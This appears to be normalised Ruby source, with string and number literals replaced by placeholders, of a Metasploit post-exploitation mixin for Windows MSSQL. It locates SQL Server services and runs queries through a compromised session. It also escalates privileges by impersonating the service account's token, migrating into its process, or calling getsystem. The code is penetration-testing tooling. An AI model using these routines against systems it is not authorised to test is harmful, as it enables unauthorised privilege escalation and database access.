require <str> require <str> require <str> module Msf class Post module Windows module MSSQL attr_accessor <str> include Msf :: Exploit :: Remote :: MSSQL_COMMANDS include Msf :: Post :: Windows :: Services include Msf :: Post :: Windows :: Priv def check_for_sqlserver ( instance = nil ) target_service = nil each_service do | service | if instance . to_s . strip . empty? if service [ <str> ] =~ <str> && service [ <str> ] !~ <str> && service [ <str> ] . to_i > <int> target_service = service break end else if ( service [ <str> ] . downcase . include? ( <str> instance <str> . downcase ) || service [ <str> ] . downcase . include? ( <str> instance <str> . downcase ) || service [ <str> ] . downcase . include? ( <str> instance <str> . downcase ) || service [ <str> ] . downcase == instance . downcase ) && service [ <str> ] !~ <str> && service [ <str> ] . to_i > <int> target_service = service break end end end if target_service target_service . merge! ( service_info ( target_service [ <str> ] ) ) end target_service end def get_sql_client client = nil if check_sqlcmd client = <str> elsif check_osql client = <str> end @sql_client = client client end def check_osql result = run_cmd ( <str> ) result =~ <str> end def check_sqlcmd result = run_cmd ( <str> ) result =~ <str> end def run_sql ( query , instance = nil , server = <str> ) target = server if instance && instance . downcase != <str> target = <str> server <str> instance <str> end cmd = <str> @sql_client <str> target <str> query <str> vprint_status ( cmd ) run_cmd ( cmd ) end def run_cmd ( cmd , token = true ) opts = { <str> = > true , <str> = > true , <str> = > token } process = session . sys . process . execute ( <str> cmd <str> , nil , opts ) res = <str> while ( d = process . channel . read ) break if d == <str> res << d end process . channel . close process . close res end def impersonate_sql_user ( service ) return false if service . nil? || service [ <str> ] . nil? || service [ <str> ] < = <int> pid = service [ <str> ] vprint_status ( <str> session . sys . config . getuid <str> ) current_privs = client . sys . config . getprivs if current_privs . include? ( <str> ) || current_privs . include? ( <str> ) || current_privs . include? ( <str> ) username = nil session . sys . process . each_process do | process | if process [ <str> ] == pid username = process [ <str> ] break end end return false unless username session . core . use ( <str> ) unless session . incognito vprint_status ( <str> username <str> ) res = session . incognito . incognito_impersonate_token ( username ) if res =~ <str> print_good ( <str> username <str> ) return true else return false end else print_warning ( <str> pid <str> ) begin session . core . migrate ( pid ) rescue Rex :: RuntimeError = > e print_error ( e . to_s ) return false end vprint_status ( <str> session . sys . config . getuid <str> ) print_good ( <str> pid <str> ) end true end def get_system print_status ( <str> ) if is_system? print_good ( <str> ) return true else print_warning ( <str> ) system_status = session . priv . getsystem if system_status && system_status . first print_good ( <str> ) return true else print_error ( <str> ) return false end end end end end end end 
